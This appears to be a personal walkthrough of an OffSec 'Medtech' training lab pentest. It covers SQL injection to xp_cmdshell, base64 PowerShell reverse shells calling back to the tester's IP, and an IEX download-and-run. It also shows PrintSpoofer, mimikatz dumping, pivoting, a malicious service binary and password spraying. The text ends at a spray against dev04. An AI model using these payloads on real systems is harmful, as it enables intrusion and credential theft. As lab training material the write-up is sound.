#box #SQLi #impacket-smbserver #ntlm-theft  #RCE #PrintSpoofer #net #mimikatz #BloodHound #Invoke-CimMethod #ligolo #password-spraying #icacls #service-binary-hijacking #sc #kerbrute #lateral-movement 
```table-of-contents
title: Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 0 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```

Medtech is an exercise consisting in an extensive network. We're tasked to perform a pentest against this network which is structured with a DMZ zone which we can reach from outside while the internal network can only be reached by tunneling from a machine in the DMZ onto a machine into the network.
The machines residing on the DMZ belong to the subnet 192.168.x.12x, while the ones in the internal network spaces in the range of 172.16.17.xxx

## Nmap

```bash title:"192.168.xx.120"
Nmap scan report for 192.168.158.120
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
|_http-title: PAW! (PWK Awesome Website)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash title:"192.168.xx.121"
Nmap scan report for 192.168.158.121
Host is up (0.033s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MedTech
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-02T16:44:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

```bash title:"192.168.xx.122"
Nmap scan report for 192.168.158.122
Host is up (0.032s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 192.168.xx.120

The machine exposes SSH and the default HTTP port. Further scans with nmap doesn't present other open ports
The website served on port 80 shows a basic website. After some though enumeration we didn't notice any vector leading us to access the target machine

---
## 192.168.xx.121

This machine exposes a bunch of services. Port 80 HTTP, 135 RPC, 139 NETBIOS,  445 SMB, 5985 WinRM.
After initial enumeration of the nullable session services such as RPC / SMB we couldn't achieve anything, so we opt to jump onto the hosted website to find an attack vector.
The websites shows a booking website for medical assistance, we notice that it's mostly static and our enumeration doesn't provide much more than what is being seen already. 
We go onto the login page and we start with basic credentials, then we think about the potential query that could be behind the login page and we opt for a SQLi.

Supposing the query could be something like:
```sql
SELECT * FROM users WHERE username = 'user' AND password = 'password'
```

We opt to place our injection `'; UNION ALL SELECT @@version` in the username form, achieving something in between like:

```sql
`SELECT * FROM users WHERE username = 'user'; UNION ALL SELECT @@version -- - AND password = 'password'`
```

This will effectively trigger the SQL Injection since a SQL Exception error is then shown below the login form:

![[attachments/challenge-1-medtech-1.png]]

This confirms we have a SQLi on that form. After some enumeration we've discovered that we can perform RCE within `master..xp_cmdshell` or hash spoofing with `master..xp_dirtree`. Both the options are worthy to try because one spoofs the hash of the user running the MSSQL service, potentially giving us a password to reuse on other logins, while the other one can grant us an access onto the target machine

### NTLM Hash Relay Attack

To gain the hash of the service's user we must set up a SMB Server on our end, we'll do that with `impacket-smbserver`:

```bash
impacket-smbserver -smb2support share ./
```

Finally, we'll trial and error until we craft the payload giving back to us the Hash:

```sql
'; exec master..xp_dirtree '\\192.168.45.244\share\test';-- -
```

![[attachments/challenge-1-medtech-2.png]]

>The spoofing also tells us the name of the machine, gaining knowledge that 192.168.xx.121 corresponds to `WEB02.MEDTECH.COM`. We can add that to the hosts file

Unfortunately, the spoofed hash seems not to be decryptable with ease, so we opt to gain a reverse shell leveraging `xp_cmdshell`

### SQL to RCE

To obtain a RCE, we must first make sure that we're able to perform RCE on the target machine. We can do so by leveraging the MSSQL function `master..xp_cmdshell`:
We try the following payload, with a nc listener, to check whether the target is effectively performing code execution or not:

```sql
'; EXEC master..xp_cmdshell 'curl http://192.168.45.244:8000/test' -- -
```

Listener:

![[attachments/challenge-1-medtech-3.png]]

Perfect, this demonstrate that we have a RCE over the target machine.
At this point, we can find a one liner to execute and gain a reverse shell on our end. For that, we used `PowerShell #3 (Base64)` from [RevShells](https://www.revshells.com/). By being encoded we ensure there are no characters that must be potentially escaped that could ruin our shell's execution.

```sql
'; EXEC master..xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA0ACIALAA4ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -- -
```

We then run a listener:

![[attachments/challenge-1-medtech-4.png]]
Obtaining a foothold into 192.168.158.121.
#### Upgrading to Windows' Fully Interactive TTY

Once gained the foothold, we're unfortunately on a non-fully interactive TTY. There are many reasons why this isn't worthy to keep when possible:
* Some commands might require a Fully Interactive TTY to be executed
* Some errors might trigger but are not properly redirected to the standard output
* No autocompletion
* No 'up' command for latest commands
* CTRL+C misuse causes the session to end, requiring a new reverse shell trigger

While the Linux Fully Interactive TTY process is smoother, to gain the same on Windows we rely on a Powershell module called [Invoke-ConPTYShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1). We start by downloading that on our machine. 
At that point we'll have to start a new listener on a different port of choice, suppose 3001. But this listener is slightly different from our usual listeners, because we must first setup the TTY to properly read the settings passed during the script's execution:

```bash
stty size # this will return us the current rows / columns of our actual TTY
nc -lvnp 3001
# Ctrl+Z
stty raw -echo; fg
```

Now we must get this ps1 file with IEX and execute it right after, pointing at our host on the listener port:

```bash
IEX(IWR http://192.168.45.244:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.45.244 -RemotePort 3001 -Rows 38 -Cols 156 # rows and columns must be equal to the ones on the size command above
```

This will give us a Fully Interactive TTY on Windows.

## Enumeration

Once on the target machine, we finally have one step into the network, at least onto the DMZ. This machine could be a tunnel into the medtech network. 
To gain some reconnaissance we run some basic commands:
* `hostname` , gives us the name of the machine, in this case WEB02
* `whoami /all`, this gives us a lot of key information that we'll explain below
* `net user`, this tells us what users are local users of the machine. From here we discover, except for the default account like:
	* Administrator
	* DefaultAccount
	* WDAGUtilityAccount
	* Guest
	  That also an user, called `offsec` is a local user of the machine. We add it to our list of users, in case a bruteforce could be helpful later on.
	  ![[attachments/challenge-1-medtech-5.png]]
* `ipconfig`, discovering that the machine belongs to two different networks: `192.168.167.xxx` and `172.16.167.xxx`
  ![[attachments/challenge-1-medtech-6.png]]

While enumerating for passwords and files, we discovered the presence of a `web.config` file in `C:\inetpub\wwwroot`. Inside of it we discover the password of a SQLEXPRESS instance, the one we used to gain the RCE. While connecting to it with `sqlcmd` we do not find anything concrete to further escalate, however we add the password to our list of password retrievals. We'll use it for password re-use bruteforce attacks.

```html title:'web.config'
<add name="myConnectionString" connectionString="server=localhost\SQLEXPRESS;database=webapp;uid=sa;password=WhileChirpTuesday218;Trusted_Connection=False;MultipleActiveResultSets=true; Integrated Security=False; Max Pool Size=500;" />

# sa:WhileChirpTuesday218
```
### Privilege Escalation

The user in question `nt service\mssql$sqlexpress` is an interesting profile. In fact, it has `SeImpersonatePrivilege`, which could lead to a `Potato` or `PrintSpoofer` attack, and it has `SeManageVolumePrivilege` which grants us control of the whole disk with [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit).
Since we want to escalate to gain full control of the machine, we opt to use for a Potato / PrintSpoofer exploit. First of all we must understand the current version of the system, discovering it runs Windows Server 2022:

![[attachments/challenge-1-medtech-7.png]]

But by looking at [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) it mention Server 2016/2019...
We must also say that the repository is no longer maintained and was updated 5 years ago (2020 at the time of writing). Let's try it anyways.
We download the exploit, we move it onto the target and then we execute it:

```shell
.\PrintSpoofer64.exe -i -c powershell # also cmd would be fine but we opted to gain a powershell session since it's more powerful
```

Gaining `NT AUTHORITY\SYSTEM` on the target machine, meaning it worked!

![[attachments/challenge-1-medtech-8.png]]

>This taught to me that it's always worthy to try a script, even if the given version might not be vulnerable at first sight. Maybe the script is no longer maintained but the issue is still present. Always worth a try.

## Looking for Lateral Movement

We're now finally able to use `net user /domain` since we're local administrator. With this command we effectively find the list of all the users enabled inside the domain. We decide to add those onto a list of users found:

![[attachments/challenge-1-medtech-11.png]]

Now that we've officially owned `WEB02.MEDTECH.COM`, we can try to use `mimikatz` to exfiltrate some information from the AD. We download it and upload it on the target machine.

>We can use mimikatz only now because mimikatz to work requires `privileges::debug`. This is possible only if the user has the privilege `SeDebugPrivilege`. NT Authority\SYSTEM by default has every privilege enabled.

>While trying to transfer the file, we had an issue with powershell that was preventing the curl request to work as intended. We downgraded to cmd and the command worked at its finest.

Once mimikatz is on the target, we run it and the use `privilege::debug`:

![[attachments/challenge-1-medtech-9.png]]

Finally, we run a command to check whether there are logon passwords stored called `sekurlsa::logonpasswords`. This command exfiltrate a lot of information, but we discover the presence of a clear text password:

![[attachments/challenge-1-medtech-10.png]]

Obtaining the first credential into the system: `joe:Flowers1`. We'll store this password for future bruteforce attacks as well.

---
## 192.168.xx.122

This machine actually have exclusively a SSH session onto it. We opt for a bruteforce attack with the users found until now with a list of common passwords + the passwords we've discovered so far:

```bash title:"users.txt"
joe
leon
mario
offsec
peach
wario
yoshi
```

```bash title:"psw.txt"
Flowers1
WhileChirpTuesday218
```

Discovering a working combination for the `offsec` user, `offsec:password`:

![[attachments/challenge-1-medtech-12.png]]

We then proceed to authenticate onto the machine in SSH:

```bash
ssh offsec@192.168.167.122
```

Finding ourselves in a `lshell` (limited shell). However, we're able to catch a local flag which is right on the same folder where we are.
Over than that, we've discovered the possibility to run `/usr/sbin/openvpn` as root but we didn't succeed in doing that.

---

## Tunneling into MEDTECH

At this point, our resources have pretty much ended. The state is the following:
* 192.168.xx.120 doesn't seems to be breachable.
	* 22 - Bruteforcing it with a mutation on the known users didn't seem to work. We'll keep trying in background
	* 80 - We didn't find any way to access it
* 192.168.xx.121 breached it and gained NT AUTHORITY, can be used for lateral movements on the DMZ and tunneling into medtech's network
* 192.168.xx.122 bruteforced the `offsec` user, gained a limited shell and found no way as of now to escape it.
	* We know that we technically can run `/usr/sbin/openvpn` as sudo (`sudo -l`) but we're unable to effectively run it

### Reconnaissance

Since we have a foothold onto the machine, we opt to use SharpHound to collect the data and then transfer the zip file back to us. We'll first upload SharpHound onto the target alongside with [PSUpload.ps1](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1), then use it and finally we'll download back the zip file to us. To download the file we use the Python's uploadserver:

```bash
source myenv/bin/activate
python3 -m venv myenv
(myenv) pip install uploadserver
(myenv) python3 -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Finally, on the target we upload the file with Invoke-FileUpload:

```shell
Invoke-FileUpload -Uri http://192.168.45.244:8000/upload -File C:\Temp\20251004015344_BloodHound.zip
```

We then upload the extracted scan into BloodHound.

The first thing we wanna do, is identify the machines we can target onto the network. To do so, we go into the Cypher tab and use the following Cypher query to return all the hosts available on the AD:

```cypher
MATCH (m:Computer) RETURN m
```

This will return us the following data:

![[attachments/challenge-1-medtech-13.png]]

We then proceed to use `nslookup` to know the IP of each machine:

```text
nslookup files02.medtech.com --> 172.16.148.11
nslookup web02.dmz.medtech.com --> 192.168.148.121 (DMZ) - 172.16.148.254 (INTERNAL)
nslookup dc01.medtech.com --> 172.16.148.10
nslookup prod01.medtech.com --> 172.16.148.13
nslookup client02.medtech.com --> 172.16.148.83
nslookup dev04.medtech.com --> 172.16.148.12
nslookup client01.medtech.com --> 172.16.148.82
```

We add the respective content to our `/etc/hosts` file:

---
## Lateral Movement on files02

At this point we have all the necessary information to move laterally into the network. We have the targets' IP and a domain user. We'll try to move laterally onto files02. To do so, we can use the following `ps1` script. The command variables shows a powershell base64 encoded script that gives us a reverse shell on port 8000. To make a test we could easily use a basic command such as `cmd /c hostname` or `calc` and then check whether the process has spawned or not on the target host.
The option below is a trigger with `Invoke-CimMethod` that grants us a shell on port 8000.

```powershell
$username = 'joe';
$password = 'Flowers1';
$secureString = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 172.16.148.11 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA0ACIALAA4ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

We'll then receive a shell on the `files02` target host, and we can confirm we're on it with the user `medtech\joe`:

![[attachments/challenge-1-medtech-14.png]]

On the target machine, we're Administrator as shown with `whoami /groups`:

![[attachments/challenge-1-medtech-15.png]]

And after some initial reconnaissance we cannot find anything suspicious in the usual folder. However, inside `C:\Users\joe\Documents` a file called `fileMonitorBackup.log` catches our attention. We open it and scroll it to check whether we can find any sensible information, until we discover the presence of some NTLM hash for the user of the domain. That's a bingo. That means we can potentially crack those hashes or use a PtH attack to authenticate with those users on the other machines?
We first use `findstr` to filter unnecessary content, and then we make a list of those users + hashes:

```shell
cat fileMonitorBackup.log | findstr NTLM

   88934 Oct 04 11:21  Backup      daisy                        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e 
   88605 Oct 04 11:21  Backup	   toad                         6872 Backup Completed. NTLM: 5be63a865b65349851c1f11a067a3068                                                                                    
   88137 Oct 04 11:21  Backup	   wario                        6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e                                                                                                           
   87139 Oct 04 11:21  Backup      goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436
```

 and try to crack it unfortunately without success except for `wario:Mushroom!`. The other hashes remain uncracked.

---

## Setting up a SOCKS tunnel with ligolo-ng

To dig deeper in the network we opt to run a SOCKS tunnel using 192.168.xx.121 as the tunnel host.
For ease, since with chisel it felt harder to make some commands work, we'll configure [ligolo-ng](https://docs.ligolo.ng/).

First of all, we download the `agent` for windows_amd64 and then the `proxy` for linux_amd64.
Once done, we run the proxy on linux:

```bash title:"Proxy"
./proxy -selfcert
```

and the agent on Windows (once transferred on the target machine):

```bash title:"Agent"
./agent.exe -connect 192.168.45.244:11601 -ignore-cert
```

Once obtained the connection, we do `session` and select the received session, creating a tunnel with the target.
Once created the tunnel, we must create an interface that's going to use that tunnel and we do that with `interface_create --name $interfaceName`.  At this point, the interface is created.
Now we must add a route to that interface to properly redirect packets on that interface on a specific subnet. In our case we want to target the internal network, which is `172.16.148.0/24`.

>We can say that's the network because the subnet has the first 3 numbers static and the last one changing. Thus, the `/24` identifies the first 3 bytes identify the subnet `172.16.148` while the last one is mobile. So by specifying `/24` we're creating a route that will target this subnet and the last number which is mobile and can change. This will permit us to point to any target inside the range `172.16.148.1 ~ 172.16.148.254`. We won't be able to target `172.16.148.0` and `172.16.148.255` because they're always reserved.

We can add a route with `interface_add_route --name medtech --route 172.16.148.0/24`. At this point, also a route connected to this interface has been created.
At this point, the only thing left is to start the tunnel on that interface and we'll be able to execute commands through the pivot on the machines inside the network.
Overall the process can be resumed as it follows:

```bash
./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng » INFO[0006] Agent joined.                                 id=0050569e9014 name="NT Service\\MSSQL$SQLEXPRESS@WEB02" remote="192.168.148.121:55882"
ligolo-ng » session
? Specify a session : 1 - NT Service\MSSQL$SQLEXPRESS@WEB02 - 192.168.148.121:55882 - 0050569e9014
[Agent : NT Service\MSSQL$SQLEXPRESS@WEB02] » interface_create --name medtech
INFO[0091] Creating a new medtech interface...          
INFO[0091] Interface created!                           
[Agent : NT Service\MSSQL$SQLEXPRESS@WEB02] » interface_list
┌───────────────────────────────────────────────────────────────────────────────┐
│ Interface list                                                                │
├───┬──────────┬────────────────────────────────────────────┬───────────────────┤
│ # │ TAP NAME │ DST ROUTES                                 │ STATE             │
├───┼──────────┼────────────────────────────────────────────┼───────────────────┤
│ 0 │ tun0     │ 192.168.45.0/24,192.168.148.0/24,fe80::/64 │ Active - 3 routes │
│ 1 │ medtech  │                                            │                   │
└───┴──────────┴────────────────────────────────────────────┴───────────────────┘
Interfaces and routes with "Pending" state will be created on tunnel start.
[Agent : NT Service\MSSQL$SQLEXPRESS@WEB02] » interface_add_route --name medtech --route 172.16.148.0/24
INFO[0640] Route created.                               
[Agent : NT Service\MSSQL$SQLEXPRESS@WEB02] » interface_list
┌───────────────────────────────────────────────────────────────────────────────┐
│ Interface list                                                                │
├───┬──────────┬────────────────────────────────────────────┬───────────────────┤
│ # │ TAP NAME │ DST ROUTES                                 │ STATE             │
├───┼──────────┼────────────────────────────────────────────┼───────────────────┤
│ 0 │ tun0     │ 192.168.45.0/24,192.168.148.0/24,fe80::/64 │ Active - 3 routes │
│ 1 │ medtech  │ 172.16.148.0/24                            │ Active - 1 routes │
└───┴──────────┴────────────────────────────────────────────┴───────────────────┘
Interfaces and routes with "Pending" state will be created on tunnel start.
[Agent : NT Service\MSSQL$SQLEXPRESS@WEB02] » tunnel_start --tun medtech
INFO[0702] Starting tunnel to NT Service\MSSQL$SQLEXPRESS@WEB02 (0050569e9014) 
```

![[attachments/challenge-1-medtech-16.png]]

We can demonstrate the tunnel is working because now we can execute any command directly on the targets as if we could connect directly to them:

![[attachments/challenge-1-medtech-17.png]]

---
## Reconnaissance in the network

Finally, we have a pivot in the network which we can use to further investigate the other hosts. Let's resume what we could target:

```text
# Inside the Network
172.16.148.10 - dc01
172.16.148.11 - files02
172.16.148.12 - dev04
172.16.148.13 - prod01
172.16.148.14 -
172.16.148.82 - client01.medtech.com
172.16.148.83 - client02.medtech.com

# DMZ
192.168.148.120 -
192.168.148.121 - web02.dmz.medtech.com
192.168.148.122
```

We try to use `wario:Mushroom!` to authenticate to the services of the network, finding out that `client01` accepts a WinRM connection with those credentials:

```bash
nxc winrm 172.16.148.0/24 -u wario -p 'Mushroom!'
```

![[attachments/challenge-1-medtech-18.png]]

---
## client01.medtech.com

Finally we know we can access through WinRM on client01, thus we use: `evil-winrm -i 172.16.148.83 -u 'wario' -p 'Mushroom!'` to authenticate into the machine.
Once there, we find really interesting the presence of a folder called `DevelopmentExecutables` in `C:\`.
Inside of it, an executable called `auditTracker.exe` can be found. If executed it returns the following error:

![[attachments/challenge-1-medtech-19.png]]

At first I thought it was necessary to update a specific registry key to allow its execution with `reg query "HKCU\Software\Microsoft"` until we found the key related to this software, but it was way easier in the end.
### Service Binary Hijacking

We notice the binary is hijackable in the following ways:
* We must ensure we have control over that binary (we need to be able to rename it and execute it)
* With `services.msc` we must find the name of service and the path to the executable
* We must be able to stop and start the executable

To understand the rights we have over that binary we'll use `icacls`:

```shell
icacls C:\DevelopmentExecutables\auditTracker.exe
```

And we see, below, that we have Full Control as EVERYONE on that binary:

![[attachments/challenge-1-medtech-20.png]]
Now, we check `services.msc` to find the effective name of the service, discovering the name of the service resembles the one of the executable:

![[attachments/challenge-1-medtech-21.png]]

This means we have the privileges to modify the executable and to manipulate the service.
At this point we can craft a malicious binary and replace the actual one with the fake one.

```cpp title:"Malicious binary"
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA0ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==");
  
  return 0;
}
```

This binary contains a base64 encoded payload in powershell that executes a reverse shell on port 9999.
We can now build it with:

```bash
x86_64-w64-mingw32-gcc shell.c -o auditTracker.exe
```

And finally upload it through `evil-winrm` on the target machine, in the target folder.
Finally, we can now stop and start the service accordingly:

```shell
sc.exe stop auditTracker 
sc.exe start auditTracker # this will end up in timeout, but will still execute our shell. Due to the composition of the malicious executable not all the commands work, but the reverse shell does.
```

>It's crucial to use `sc.exe` instead of just `sc`. For some reason the latter simply does not work

Receiving a shell on port 9999

![[attachments/challenge-1-medtech-22.png]]

From here, we can achieve the proof.txt flag of the `client02` machine.

---
## Kerbrute

At this point, we can start password spraying for further user access. The password that we've collected so far are from the medtech domain are:

```bash
password # from offsec's user
WhileChirpTuesday # from web02 web.config
Flowers1 # from web02 mimikatz's logon passwords
Mushroom! # from files02 fileMonitorBackup.log NTLM disclosure
```

Upon performing password spray, we discover a password reuse occurring with the `Mushroom!` password for the user `yoshi`, the other password doesn't give us any other path in the system:

```bash
./kerbrute_linux_amd64 passwordspray -d medtech.com --dc dc01.medtech.com users.txt 'Mushroom!'
```

![[attachments/challenge-1-medtech-23.png]]

---

## dev04.medtech.com

After spraying on open services for each machine, we discover that `yoshi:Mushroom!` can connect through RDP on `dev04`:

```bash
nxc rdp 172.16.148.0/24 -u yoshi -p 'Mushroom!'
```

